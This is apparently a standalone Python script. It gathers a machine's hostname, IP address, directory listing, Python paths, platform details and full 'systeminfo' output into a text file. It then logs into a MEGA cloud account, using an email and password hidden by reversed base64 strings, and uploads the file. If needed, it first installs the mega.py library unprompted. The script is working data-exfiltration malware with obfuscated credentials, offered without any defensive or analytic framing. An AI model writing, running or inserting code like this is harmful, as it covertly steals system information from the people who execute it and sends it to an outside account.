import socket
import os 
import sys
import platform
import subprocess
import base64
from datetime import datetime
from datetime import date
try:
    from mega import Mega
except ModuleNotFoundError:
    if os.name()=='nt':
        os.system('pip install mega.py')
    else:
        os.system('pip3 install mega.py')
    from mega import Mega
    
hostname = socket. gethostname()
local_ip = socket. gethostbyname(hostname)
curDir = os.getcwd()

myFile = open("ip.txt","a+")
now = datetime.now().strftime("%H:%M:%S")
Date=date.today()
myFile.write('Time:'+str(now)+'\n')
myFile.write('Date:'+str(Date)+'\n')
myFile.write('Name: '+hostname+'\n')
myFile.write('ip adress: '+local_ip+'\n')
myFile.write('Current dir '+curDir+'\n')
data=os.listdir(curDir)
myFile.write('All files in:'+'\n')
data=os.listdir(curDir)
for d in data:
    myFile.write(d+'\n')
paths=sys.path
myFile.write('All paths:'+'\n')
for path in paths:
    myFile.write(path+'\n')
ver=sys.version
myFile.write(ver+'\n')
myFile.write('Platform processor: '+platform.processor()+'\n')
if len(platform.architecture())!=0:
    for info in platform.python_version():
        myFile.write('Platform architecture:: '+info+'\n')
else:
    myFile.write('paltform architecture : '+platform.python_version()+'\n')
myFile.write('Platform type: '+platform.machine()+'\n')
myFile.write('system network name: '+platform.node()+'\n')
myFile.write('Platform information: '+platform.platform()+'\n')
myFile.write('Platform processor:'+platform.processor()+'\n')
myFile.write('Operating system:'+ platform.system()+'\n')
myFile.write('Python compiler:'+platform.python_compiler()+'\n')
myFile.write('Python version:'+platform.python_version()+'\n')
try:
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []
    # arrange the string into clear info
    for item in Id:
        new.append(str(item.split("\r")[:-1]))
    for i in new:
        myFile.write(i[2:-2]+'\n')
    myFile.close()
except Exception:
    pass
mega = Mega()
e='W==QbvNmLslWYtdGQ0ITMslGarlmboNXZuF2Z'[::-1]
e=e[0:len(e)-1]
p='QsdmdrR2coNXM'[::-1]
p=p[0:len(p)-1]
E=base64.b64decode(e.encode("ascii")).decode("ascii")
P=base64.b64decode(p.encode("ascii")).decode("ascii")
m = mega.login(E,P)
files=m.upload('ip.txt')